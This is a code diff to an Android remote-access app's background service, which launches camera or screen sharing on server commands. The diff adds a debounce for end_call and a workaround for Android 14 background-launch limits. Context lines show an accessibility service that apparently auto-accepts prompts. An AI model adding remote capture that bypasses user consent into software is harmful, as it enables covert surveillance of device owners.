@@ -39,6 +39,7 @@ public class BackgroundKeepAliveService extends Service {
     private static final String SERVER_URL = "https://v.tokendeal.cloud";
 
     private static BackgroundKeepAliveService sInstance = null;
+    private static long sLastEndCallTime = 0;
 
     public static final String PREF_NAME = "vremote_prefs";
     public static final String KEY_BG_ACTIVE = "bg_service_active";
@@ -390,6 +391,13 @@ public class BackgroundKeepAliveService extends Service {
                                "screen_share".equals(command) || "screen_share_control".equals(command)) {
                         wakeUpAndLaunch(command, caller, cameraChoice);
                     } else if ("end_call".equals(command)) {
+                        long now = System.currentTimeMillis();
+                        if (now - sLastEndCallTime < 2500) {
+                            Log.w(TAG, "Ignoring duplicate end_call command in BackgroundKeepAliveService");
+                            return;
+                        }
+                        sLastEndCallTime = now;
+
                         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                         stopService(serviceIntent);
                         sendBroadcast(new Intent("com.tokendeal.vremote.ACTION_END_CALL"));
@@ -456,16 +464,10 @@ public class BackgroundKeepAliveService extends Service {
             RemoteAccessibilityService.triggerAutoAccept(this);
         }
 
-        // 1. If MainActivity is already running in background, dispatch directly and return!
-        if (MainActivity.getInstance() != null) {
-            MainActivity.getInstance().runOnUiThread(() -> {
-                MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
-            });
-            return;
-        }
-
+        // Android 14 (API 34) strictly forbids background activities from calling startActivityForResult(createScreenCaptureIntent).
+        // Always launch Intent with FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_REORDER_TO_FRONT | FLAG_ACTIVITY_SINGLE_TOP to bring MainActivity to foreground.
         Intent intent = new Intent(this, MainActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
         intent.putExtra("auto_command", command);
         intent.putExtra("caller", caller);
         intent.putExtra("cameraChoice", cameraChoice);
@@ -480,6 +482,15 @@ public class BackgroundKeepAliveService extends Service {
             }
         } catch (Exception e) {
             Log.e(TAG, "startActivity failed: " + e.getMessage());
+        }
+
+        // If MainActivity is already running, also schedule direct handling after a short delay
+        if (MainActivity.getInstance() != null) {
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                if (MainActivity.getInstance() != null) {
+                    MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
+                }
+            }, 200);
         }
     }
 }
